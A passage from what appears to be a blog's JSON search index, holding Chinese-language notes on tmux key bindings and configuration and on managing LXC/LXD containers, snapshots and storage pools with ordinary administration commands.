\u5feb\u6377\u952e\n</code></pre>","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#\u9ed8\u8ba4\u5feb\u6377\u952e","title":"\u9ed8\u8ba4\u5feb\u6377\u952e","text":"","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#\u5217\u51fa\u6240\u6709\u5feb\u6377\u952e","title":"\u5217\u51fa\u6240\u6709\u5feb\u6377\u952e","text":"<pre><code>tmux list-keys\n</code></pre>","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#\u7ec4\u5408\u952e","title":"\u7ec4\u5408\u952e","text":"<p>\u7ec4\u5408\u952e\uff1a\u9ed8\u8ba4\u662f ctrl-b\u3002\u63a8\u8350\u4fee\u6539\u7ec4\u5408\u952e\uff1a</p> <pre><code>tmux set -g prefix C-x\n</code></pre>","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#tmux-\u547d\u4ee4\u884c","title":"tmux \u547d\u4ee4\u884c","text":"<p>\u5728 tmux \u7a97\u53e3\uff0c\u8f93\u5165 tmux \u547d\u4ee4\u5feb\u6377\u952e\u3002\u4e4b\u540e\u5c31\u53ef\u4ee5\u8fd0\u884c tmux \u652f\u6301\u7684\u6240\u6709\u547d\u4ee4\uff0c\u548c\u547d\u4ee4\u884c\u4e00\u6837</p> <pre><code>ctrl-b :\n</code></pre>","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#\u7a97\u53e3\u7ba1\u7406","title":"\u7a97\u53e3\u7ba1\u7406","text":"","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#window","title":"window","text":"<pre><code>#\u521b\u5efa\nctrl-b c #\u521b\u5efa\u65b0\u7684\u7a97\u53e3\nctrl-b &amp; #\u5220\u9664\u5f53\u524d\u7a97\u53e3\n\n#\u79fb\u52a8\nctrl-b p #\u5207\u6362\u4e0a\u4e00\u4e2a\nctrl-b n\n\nctrl-b f #\u67e5\u627e\u5173\u952e\u5b57\n</code></pre> <p>\u8fd8\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4</p> <pre><code>ctrl-b :kill-window\n</code></pre>","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#pane","title":"pane","text":"<pre><code># \u521b\u5efa\nctrl-b \"      # \u4e0a\u4e0b\u5207\u5206\nctrl-b %      # \u5de6\u53f3\u5207\u5206\nctrl-b x      # \u5220\u9664\n\n# \u5207\u6362pane\nctrl-b o      # \u987a\u5e8f\u904d\u5386pane\nctrl-b \u65b9\u5411\u952e  # \u65b9\u5411\u952e\u79fb\u52a8\n\nctrl-b z      # zoom\n\n# \u79fb\u52a8\n</code></pre>","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#\u5e38\u7528\u81ea\u5b9a\u4e49\u914d\u7f6e","title":"\u5e38\u7528\u81ea\u5b9a\u4e49\u914d\u7f6e","text":"","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#bind-keys-\u8be6\u7ec6","title":"bind-keys \u8be6\u7ec6","text":"<p><code>bind-key [-nr] [-N note] [-T key-table] key command [arguments]</code></p> <ul> <li><code>-T</code> \u6307\u5b9a\u7ed1\u5b9a\u54ea\u4e2a table<ul> <li>\u9ed8\u8ba4\u7ed1\u5b9a prefix table</li> <li>root table\u3002\u4e0d\u9700\u8981\u6309 prefix \u5c31\u53ef\u4ee5\u89e6\u53d1</li> <li><code>-n</code> \u662f <code>-T root</code> \u522b\u540d</li> </ul> </li> <li><code>-r</code> \u8868\u793a key \u53ef\u80fd\u8fde\u7eed\u8f93\u5165\uff08\u5426\u5219\u540e\u9762\u7684\u4f1a\u88ab\u5ffd\u7565\uff09\u3002\u89c1 repeat-time (ms)</li> <li><code>-N</code> \u6dfb\u52a0\u8bf4\u660e\uff0c<code>list-keys -N</code> \u53ef\u89c1</li> </ul> <p>repeat-time \u8c8c\u4f3c\u53ea\u80fd\u8bbe\u7f6e\u5168\u5c40\u503c\uff0c\u800c\u4e14\u6211\u8bd5\u4e86 3000ms \u4e0d\u8d77\u4f5c\u7528\uff0c\u4ecd\u7136\u662f\u9ed8\u8ba4\u7684 500ms\u3002</p> <ul> <li><code>list-keys</code>: List key bindings.<ul> <li>-T lists only keys in key-table.</li> </ul> </li> <li><code>send-keys key ...</code>: Send a key or keys to a window.<ul> <li>-X is used to send a command into copy mode - see the WINDOWS AND PANES section.</li> </ul> </li> <li><code>send-prefix [-2] [-t target-pane]</code><ul> <li>Send the prefix key, or with -2 the secondary prefix key, to a window as if it was pressed.</li> </ul> </li> <li><code>unbind-key [-anq] [-T key-table] key</code><ul> <li>-a, remove all key bindings</li> <li>The -q option prevents errors being returned.</li> </ul> </li> </ul>","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#\u5173\u95ed\u7a97\u53e3\u4e0d\u8981\u786e\u8ba4","title":"\u5173\u95ed\u7a97\u53e3\u4e0d\u8981\u786e\u8ba4","text":"<pre><code>\u279c  ~ tmux list-keys | grep confirm-before\nbind-key    -T prefix       &amp;                     confirm-before -p \"kill-window #W? (y/n)\" kill-window\nbind-key    -T prefix       x                     confirm-before -p \"kill-pane #P? (y/n)\" kill-pane\n</code></pre> <p>\u5c06&amp;\u548c x \u91cd\u65b0\u6620\u5c04\u5373\u53ef</p> <pre><code>bind-key &amp; kill-window\nbind-key x kill-pane\n</code></pre>","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#\u9f20\u6807\u6eda\u8f6e","title":"\u9f20\u6807\u6eda\u8f6e","text":"<p>windows terminal \u4e2d\u5982\u4f55\u6eda\u52a8\u9f20\u6807</p> <pre><code>tmux set -g mouse on\n</code></pre>","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#swap-window","title":"swap window","text":"<p>prefxi:\u8fdb\u5165\u547d\u4ee4\u884c</p> <pre><code>swap-window -s 3 -t 1     # window number 3 and window number 1 swap their positions.\nswap-window -t 0          # \u5c06\u5f53\u524d\u7a97\u53e3\u548ctop\u7a97\u53e3\u4ea4\u6362\nmove-window -t 0          # In the unlikely case of having no window at index 0\n</code></pre> <p>\u8bbe\u7f6e\u5feb\u6377\u952e</p> <pre><code>bind-key -n C-S-Left swap-window -t -1\\; select-window -t -1\nbind-key -n C-S-Right swap-window -t +1\\; select-window -t +1\n</code></pre>","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#\u4fee\u6539\u6253\u5f00\u7a97\u53e3\u65f6\u9ed8\u8ba4\u8def\u5f84","title":"\u4fee\u6539\u6253\u5f00\u7a97\u53e3\u65f6\u9ed8\u8ba4\u8def\u5f84","text":"<p>tmux \u9ed8\u8ba4\u8def\u5f84\u662f\u521b\u5efa tmux \u8fdb\u7a0b\u65f6\u7684\u8def\u5f84\uff0c\u4e4b\u540e\u521b\u5efa\u7a97\u53e3\u548c panel \u90fd\u9ed8\u8ba4\u662f\u8be5\u8def\u5f84\u3002\u4f46\u6709\u65f6\u6211\u4eec\u5e0c\u671b\u80fd\u591f\u66f4\u6539\u9ed8\u8ba4\u8def\u5f84\u3002\u901a\u8fc7 attach-session \u547d\u4ee4\u66f4\u6539\u3002 \u5e76\u4e14\u521b\u5efa panel \u65f6\uff0c\u4e00\u822c\u5e0c\u671b\u590d\u7528\u5f53\u524d\u8def\u5f84\u3002\u53ef\u4ee5\u5728\u5bf9\u5e94\u5feb\u6377\u952e\u540e\u6dfb\u52a0<code>-c</code>\u53c2\u6570\u5373\u53ef</p> <pre><code>bind M-c attach-session -c \"#{pane_current_path}\" # alt-c, to change current path\n\n# @ pane\n# split current window horizontally\nbind _ split-window -v -c \"#{pane_current_path}\"\n\n# split current window vertically\nbind - split-window -h -c \"#{pane_current_path}\"\n</code></pre>","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#tmux-in-tmux","title":"tmux in tmux","text":"<p>tmux \u5185\u8054\u4f7f\u7528\u65b9\u6cd5 | \u628a\u95ee\u9898\u90fd\u8bb0\u4e0b\u6765 (fatfatson.github.io)</p> <pre><code>#\u6309F12\u5207\u6362\u5230\u5185\u5d4ctmux\uff0c\u5728macos\u91cc\u9700\u8981\u7cfb\u7edf\u8bbe\u7f6e\u4e2d\u53d6\u6d88F12\u5360\u7528  \n#1. prefix\u4e3aNone\uff0c\u4e0d\u518d\u62e6\u622a\u5feb\u6377\u952e  \n#2. key-table\u4e3aoff\uff0c\u4e0b\u9762\u518d\u7ed1\u5b9aoff\u4e0b\u7684F12\uff0c\u4f7f\u4e4b\u80fd\u9000\u51fa\u5185\u5d4c\u6a21\u5f0f  \n#3. \u6539\u53d8statusbar\u989c\u8272\uff0c\u4ee5\u4fbf\u77e5\u9053\u5df2\u8fdb\u5165\u5185\u5d4c\u6a21\u5f0f  \n#4. \u5982\u679c\u5904\u4e8e\u7279\u6b8a\u6a21\u5f0f\uff0c\u9000\u51fa  \nunbind -T root F12  \nbind -T root F12 \\  \n  set prefix None \\;\\  \n  set key-table off \\;\\  \n  set status-style bg=colour235 \\;\\  \n  if -F '#{pane_in_mode}' 'send-keys -X cancel' \\;\\  \n  refresh-client -S  \n\n#\u5728off\u8868\u91cc\u7ed1\u5b9aF12\uff0c\u6062\u590d\u4e4b\u524d\u7684\u8bbe\u7f6e\uff0c\u4ee5\u9000\u51fa\u8be5\u6a21\u5f0f  \nbind -T off F12 \\  \n  set -u prefix \\;\\  \n  set -u key-table \\;\\  \n  set -u status-style \\;\\  \n  refresh-client -S\n</code></pre>","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#\u641c\u7d22\u6587\u5b57","title":"\u641c\u7d22\u6587\u5b57","text":"<p><code>prefix+[</code> \u8fdb\u5165 copy mode\uff0c\u7136\u540e<code>/</code> \u8fdb\u884c\u641c\u7d22\u3002\u903b\u8f91\u548c vim \u4e00\u6837\uff0c<code>n</code> \u548c <code>shift+n</code> \u5411\u4e0b\u548c\u5411\u4e0a\u641c\u7d22\u3002</p>","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#move-running-process-to-tmux","title":"move running process to tmux","text":"<p>Move a running process into a tmux session | ./xai.sh</p>","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#\u5176\u4ed6\u95ee\u9898","title":"\u5176\u4ed6\u95ee\u9898","text":"","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/10/05/2022-10-05-tmux/#window-\u4e4b\u95f4\u540c\u6b65-history","title":"window \u4e4b\u95f4\u540c\u6b65 history","text":"<p>\u9ed8\u8ba4\u4e0d\u4f1a\u7acb\u5373\u5199\u5165 histroy file\uff0c\u522b\u7684\u7a97\u53e3\u65e0\u6cd5\u77e5\u9053\u53e6\u4e00\u4e2a\u7a97\u53e3\u76ee\u524d\u8f93\u5165\u7684\u547d\u4ee4</p> <p>\u89e3\u51b3\uff1a\u624b\u52a8\u66f4\u65b0 history \u6587\u4ef6 <pre><code>history -a\n</code></pre></p>","tags":["tmux"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/","title":"LXC \u4f7f\u7528","text":"","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#1-\u8bf4\u660e","title":"1 \u8bf4\u660e","text":"","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#lxc-vs-docker","title":"lxc vs docker","text":"<p>LXC \u662f\u4e00\u79cd\u8f7b\u91cf\u865a\u62df\u673a\uff0c\u590d\u7528 host \u5185\u6838\u3002\u4e0e docker \u5c3d\u53ef\u80fd\u6bcf\u4e2a\u5bb9\u5668\u53ea\u8dd1\u4e00\u4e2a\u5e94\u7528\u4e0d\u540c\uff0clxc \u7684\u601d\u8def\u66f4\u63a5\u8fd1\u865a\u62df\u673a\u3002 </p> <p>The key networking difference between Docker and LXC is that with LXC one can attach a\u00a0container\u00a0to any bridge on the Host. This includes a bridge on the outside interface. Via\u00a0transparent bridging\u00a0the\u00a0container\u00a0can have unfettered access to the existing IPv6 subnet, including picking up Global Unique Addresses (GUAs) without the host having to do router-like functions, such as adding routes, auto propagation of prefixes (with DHCPv6-PD), redistribution of routes, etc. Again, things which Docker doesn't support.</p>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#lxc-vs-lxd","title":"lxc vs lxd","text":"<p>LXD is actually two parts, the\u00a0<code>lxd</code>\u00a0daemon, and the\u00a0<code>lxc</code>\u00a0CLI client which makes calls to the\u00a0<code>lxd</code>\u00a0daemon</p>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#2-get-started","title":"2 get started","text":"","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<p>ubuntu \u5b89\u88c5 lxd \u4f1a\u4f7f\u7528 snap\u3002</p> <pre><code>sudo apt install lxd\n</code></pre> <p>\u8981\u60f3\u4f7f\u7528 lxd \u65f6\u975e\u7ba1\u7406\u5458\uff0c\u9700\u8981\u5c06\u7528\u6237\u6dfb\u52a0\u5230 lxd \u7ec4 p.s \u73b0\u5728\u5b89\u88c5\u65f6\u5df2\u7ecf\u81ea\u52a8\u6dfb\u52a0\u5230 lxd \u7ec4\u4e86</p> <pre><code>sudo adduser {USERNameHere} lxd\n</code></pre> <p>\u7b2c\u4e00\u6b21\u4f7f\u7528 lxd\uff0c\u9700\u8981\u8fdb\u884c\u521d\u59cb\u5316\uff1a<code>sudo lxd init</code>\u3002\u521d\u59cb\u5316\u4f1a\u8bbe\u7f6e\u7f51\u7edc\u548c\u5b58\u50a8  \u53ef\u4ee5\u624b\u52a8\u67e5\u770b\u521d\u59cb\u5316\u7ed3\u679c</p> <pre><code>lxc profile list  \nlxc profile show\u00a0default  \nlxc network list\nlxc storage list\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u955c\u50cf","title":"\u955c\u50cf","text":"<p>\u901a\u8fc7\u7f51\u7ad9\u67e5\u770b\uff1aLinux Containers - Image server \u6216\u547d\u4ee4\u884c</p> <pre><code>lxc image list images: |grep ubuntu #\u67e5\u770b\u5b98\u65b9lxc\u955c\u50cf\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u5bb9\u5668\u7ba1\u7406","title":"\u5bb9\u5668\u7ba1\u7406","text":"","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u521b\u5efa\u5bb9\u5668","title":"\u521b\u5efa\u5bb9\u5668","text":"<pre><code>lxc launch images:{**distro**}/{**version**}/{**arch**} {**container-name-here**}  #\u521b\u5efa\u5bb9\u5668\nlxc launch -p default -p extbridge images:ubuntu/jammy ubuntu22\nlxc launch -p default -p extbridge images:debian/10 debian10\n</code></pre> <p>\u6216\u8005</p> <pre><code>lxc init local:openwrt-x86 openwrt\nlxc config edit openwrt #\u4e4b\u540e\u518d\u8fdb\u884c\u4fee\u6539\uff0c\u6bd4\u5982\u4fee\u6539\u5176\u4e2d\u7684profile\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u7ba1\u7406","title":"\u7ba1\u7406","text":"<pre><code>lxc list/ls\n\nlxc start/stop/restart/delete {container-name}\n\nlxc info {container-name}\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u7f16\u8f91","title":"\u7f16\u8f91","text":"<pre><code>lxc config edit &lt;instance_name&gt;\nlxc config show &lt;instance_name&gt; --expaned\n\nlxc config device add &lt;instance_name&gt; &lt;device_name&gt; nic nictype=&lt;nic_type&gt; ...   #\u6dfb\u52a0\u4e00\u4e2a\u8bbe\u5907\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u81ea\u542f\u52a8","title":"\u81ea\u542f\u52a8","text":"<pre><code>lxc config set container_name boot.autostart true\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u6267\u884c\u547d\u4ee4","title":"\u6267\u884c\u547d\u4ee4","text":"<pre><code>lxc exec containerName -- command  \nlxc exec containerName -- /path/to/script  \nlxc exec containerName --env EDITOR=/usr/bin/vim -- command\n\nlxc exec {container-name} {shell-name}     #\u83b7\u5f97shell\n\nlxc exec {container-name} --su --login yfy\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u6587\u4ef6\u79fb\u52a8","title":"\u6587\u4ef6\u79fb\u52a8","text":"<pre><code>lxc file pull {continer-nane}/{path/to/file} {/path/to/local/dest}\nlxc file push {/path/to/file} {continer-nane}/path/to/dest/dir/\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#3-\u5feb\u7167","title":"3 \u5feb\u7167","text":"<p>lxc snapshot {container} {snapshot-name} lxc info {container} lxc restore {container} {snapshot-name} lxc delete {container}/{snapshot}</p> <pre><code>lxc snapshot debian docker_base_image\nlxc publish debian/docker_base_image --alias docker_image       # publish image to local:\n\n# start a lxc/docker container called docker1\nlxc launch -p default -p extbridge local:docker_image docker1\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#stateful-\u5feb\u7167","title":"stateful \u5feb\u7167","text":"<ul> <li>1\uff1a\"Unable to create a stateful snapshot. CRIU isn't installed\" even when criu.enabled = true - LXD - Linux Containers Forum</li> </ul>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u5feb\u7167\u5927\u5c0f","title":"\u5feb\u7167\u5927\u5c0f","text":"<p>zfs \u5feb\u7167\u4e0d\u662f\u7d2f\u52a0\u7684_cumulative_\uff0c\u800c\u662f\u5feb\u7167\u5efa\u7acb\u65f6\u548c\u6700\u65b0\u7684\u6587\u4ef6\u7cfb\u7edf\u5dee\u5f02\uff1a[ZFS] Destroy snapshots \u2013 nocin.eu \u8fd8\u6ca1\u6709\u5b9e\u73b0\uff1aCalculating snapshot size - LXD - Linux Containers Forum</p>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u6279\u91cf\u5220\u9664\u5feb\u7167","title":"\u6279\u91cf\u5220\u9664\u5feb\u7167","text":"<pre><code>lxc query \"/1.0/instances/op2/snapshots?recursion=1\" |jq -r '.[].name' | xargs -I SNAP echo lxc delete op2/SNAP\n\n# \u590d\u5236\u540e\u624b\u52a8\u6267\u884c\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#4-storage","title":"4 storage","text":"<p>About storage pools, volumes and buckets - LXD documentation (linuxcontainers.org)</p>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#storage-pool","title":"storage pool","text":"","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u5b58\u50a8\u4f4d\u7f6e","title":"\u5b58\u50a8\u4f4d\u7f6e","text":"<ul> <li>\u4f7f\u7528 host \u6587\u4ef6\u7cfb\u7edf\uff1a\u76ee\u5f55\uff0cbtrfs\uff08\u4e13\u95e8 sub-volume\uff09\uff0czfs\uff08\u4e13\u95e8 dataset\uff09</li> <li>\u4e13\u95e8\u5206\u533a</li> <li>loop disk\uff1aThis means that every write must go through the storage driver and your main drive\u2019s file system, which leads to decreased performance. \u00a0<ul> <li>\u4f4d\u4e8e\uff1a<code>/var/snap/lxd/common/lxd/disks/</code>\uff08snap\uff09\u6216\u8005<code>/var/lib/lxd/disks/</code></li> </ul> </li> </ul>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u521b\u5efa","title":"\u521b\u5efa","text":"<pre><code>lxc storage create &lt;pool_name&gt; &lt;driver&gt; [configuration_options...]\n\nlxc storage list\nlxc storage show &lt;pool_name&gt;\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#btrfs","title":"btrfs","text":"<pre><code>lxc storage create pool1 btrfs    # loop-backed\n\nlxc storage create pool2 btrfs source=/some/path  # Use the existing Btrfs file system at\u00a0`/some/path`\u00a0for\u00a0`pool2`\n\nlxc storage create pool3 btrfs source=/dev/sdX\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#zfs","title":"zfs","text":"<pre><code>lxc storage create pool3 zfs source=my-tank   # use existing pool\nlxc storage create pool4 zfs source=my-tank/slice # use existing dataset\n</code></pre> <p>\u5747\u4e0d\u652f\u6301\u81ea\u5b9a\u4e49 loop back \u6587\u4ef6\u4f4d\u7f6e</p> <pre><code>yfy@snode6 \u279c  /extra lxc storage create pool0 zfs source=/extra/lxd_storage/zfs_lxd.img\nError: Custom loop file locations are not supported\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#volume","title":"volume","text":"","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u7c7b\u578b","title":"\u7c7b\u578b","text":"<pre><code>lxc storage volume list zfs_lxd  # \u67e5\u770bvolume\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u6309\u7167\u529f\u80fd\u5206\u7c7b","title":"\u6309\u7167\u529f\u80fd\u5206\u7c7b","text":"<p><code>container</code>/<code>vm</code>(i.e instance)</p> <ul> <li>\u521b\u5efa instance \u65f6\u81ea\u52a8\u521b\u5efa\uff0c\u4f5c\u4e3a instance \u6839\u6587\u4ef6\u7cfb\u7edf\u3002</li> <li>\u5220\u9664 instance \u65f6\u9500\u6bc1 image</li> <li>lxd \u81ea\u52a8\u521b\u5efa\u4e00\u4e2a image \u5377\uff0cwhen it unpacks an image to launch one or more instances from it.</li> <li>\u5b58\u50a8\u81ea\u5df1\u521b\u5efa\u7684 image\uff08\u5305\u542b\u6587\u4ef6\u7cfb\u7edf\u548c\u5143\u4fe1\u606f\uff09 custom</li> <li>\u7528\u4e8e\u5355\u72ec\u5b58\u50a8\u6570\u636e</li> </ul> <p>snapshot \u548c\u4e0a\u9762\u6ca1\u6709\u672c\u8d28\u533a\u522b\uff0clist \u7684\u7c7b\u578b\u540d\u4e3a\u4e0a\u8ff0\u7c7b\u578b\u52a0\u4e0a\u4e00\u4e2a (snapshot)</p>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u5185\u5bb9\u5206\u7c7b","title":"\u5185\u5bb9\u5206\u7c7b","text":"<ul> <li>filesystem<ul> <li>\u7528\u4e8e\u5bb9\u5668\u548c\u5bb9\u5668\u955c\u50cf</li> <li>\u53ef\u4ee5\u6dfb\u52a0\u5230\u5bb9\u5668\u548c\u865a\u62df\u673a\uff0c\u53ef\u4ee5\u5171\u4eab</li> </ul> </li> <li>block<ul> <li>\u7528\u4e8e\u865a\u62df\u673a\u548c\u865a\u62df\u673a\u955c\u50cf</li> <li>\u4e0d\u80fd\u5171\u4eab</li> </ul> </li> </ul>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u521b\u5efa-volume","title":"\u521b\u5efa volume","text":"<p>instance volume \u662f\u81ea\u52a8\u521b\u5efa\u7684</p> <p>\u521b\u5efa custom volume</p> <pre><code>lxc storage volume create &lt;pool_name&gt; &lt;volume_name&gt; [configuration_options...]  # \u9ed8\u8ba4filesystem\u7c7b\u578b\nlxc storage volume create &lt;pool_name&gt; &lt;volume_name&gt; --type=block [configuration_options...]  # block\u7c7b\u578b\n</code></pre> <p>\u8bbe\u7f6e\u7528\u4e8e\u5b58\u50a8 backup \u6216 image tarball</p> <pre><code>lxc config set storage.backups_volume &lt;pool_name&gt;/&lt;volume_name&gt;\nlxc config set storage.images_volume &lt;pool_name&gt;/&lt;volume_name&gt;\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u5907\u4efd-volume","title":"\u5907\u4efd volume","text":"<p>\u51e0\u79cd\u65b9\u5f0f</p> <ul> <li>snapshot\uff1a\u5b58\u50a8\u5728\u540c\u4e00\u4e2a pool\uff0c\u56e0\u6b64\u53ef\u9760\u6027\u4e0d\u8db3\u3002</li> <li>\u5bfc\u51fa\u6587\u4ef6\uff1a\u53ef\u4ee5\u5b58\u50a8\u5728\u4e0d\u540c disk \u4e0a\u3002\u53ef\u4ee5 import \u5230\u4e0d\u540c pool \u4e0a</li> <li>copy \u5230\u8fdc\u7a0b\uff1a\u9700\u8981 network-connected LXD server</li> </ul> <pre><code>lxc storage volume snapshot &lt;pool_name&gt; &lt;volume_name&gt; [&lt;snapshot_name&gt;]   # \u7c7b\u578b\u4e3acustom (snapshot) \nlxc storage volume restore &lt;pool_name&gt; &lt;volume_name&gt; &lt;snapshot_name&gt;\n</code></pre> <pre><code>lxc storage volume export &lt;pool_name&gt; &lt;volume_name&gt; [&lt;file_path&gt;]   # \u9ed8\u8ba4\u4e3a./backup.tar.gz\nlxc storage volume import &lt;pool_name&gt; &lt;file_path&gt; [&lt;volume_name&gt;]  # \u9ed8\u8ba4\u4f7f\u7528\u539f\u672cvolume\u540d\u5b57\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u79fb\u52a8\u590d\u5236-volume","title":"\u79fb\u52a8\u590d\u5236 volume","text":"<ul> <li>custom 